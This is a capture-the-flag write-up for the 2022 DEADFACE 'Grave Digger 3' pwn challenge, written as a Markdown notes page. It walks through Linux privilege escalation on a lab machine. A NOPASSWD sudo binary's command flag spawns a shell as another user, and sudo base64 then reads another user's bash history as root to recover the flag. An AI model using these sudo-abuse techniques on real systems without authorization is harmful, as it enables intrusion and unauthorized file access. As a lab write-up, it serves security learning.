---
# Obsidian
tags:
- ctf
- 2022-deadface
- pwn
- linux

# Jekyll
layout: ctf
type: problem

# Problem info
ctf: 2022-deadface
category: pwn
title: Grave Digger 3
points: 300
solved: true
---

# Grave Digger 3

## Instructions

There is one more flag that DEADFACE has hidden on `d34th`'s machine. Somehow, you'll have to find a way to access `d34th`'s files in his home directory. Submit the flag as `flag{flag text}`

env.deadface.io Password: `123456789q`

_Use context from **[Grave Digger 1](Grave%20Digger%201)** and **[Grave Digger 2](Grave%20Digger%202)**_

## Solution

Exfiltrating the binary and reverse engineering it (or just reading the man page) shows existence of a flag that can be used to run an arbitrary command. 

```
-c, --command COMMAND
        Execute a command (for troubleshooting purposes ONLY).
```

In this man page we also find the email address for lilith which is used for [Contact](Contact)

```
AUTHOR
       Lilith (bl0ody_mary@deadface.io)
```

Additionally, `crypto_vamp` can run `/opt/reader` as lilith with `NOPASSWD`

```
crypto_vamp@da4c4c0c34da:~$ sudo -l
Matching Defaults entries for crypto_vamp on da4c4c0c34da:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User crypto_vamp may run the following commands on da4c4c0c34da:
    (lilith) NOPASSWD: /opt/reader
```

We can leverage this to escalate to a shell as lilith.
```
crypto_vamp@da4c4c0c34da:~$ sudo -u lilith /opt/reader -c /bin/bash
lilith@da4c4c0c34da:~$ id
1: uid=4817(lilith) gid=4817(lilith) groups=4817(lilith),4818(deadface)
```

Lilith has several utilities that can be used to read arbitrary files as the root user:
```
lilith@da4c4c0c34da:~$ sudo -l
2: Matching Defaults entries for lilith on da4c4c0c34da:
3:     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sb4: in\:/bin\:/snap/bin
5: 
6: User lilith may run the following commands on da4c4c0c34da:
7:     (ALL) NOPASSWD: /usr/bin/base64
8:     (ALL) NOPASSWD: /usr/bin/gzip
9:     (ALL) NOPASSWD: /user/bin/gunzip
```

We can use this to read spookyboi's bash history.

```
lilith@da4c4c0c34da:~$ sudo base64 /home/spookyboi/.bash_history | base64 -d
10: ls -l
11: cd ~
12: mkdir docs
13: rm -rf docs
14: wget https://pastebin.com/raw/XX2nkn3W > gravedigger3.txt
15: rm gravedigger3.txt
16: openssl genrsa -aes128 -out spookyboi-priv.pem 1024
17: openssl rsa -in spookyboi-priv.pem  -pubout > spookyboi-public.pem
18: rm spookyboi-public.pem
19: mv *.pem .keys/
```

Following the pastebin link gives us the flag.

```
flag{b4d_h1sTOrY}
```

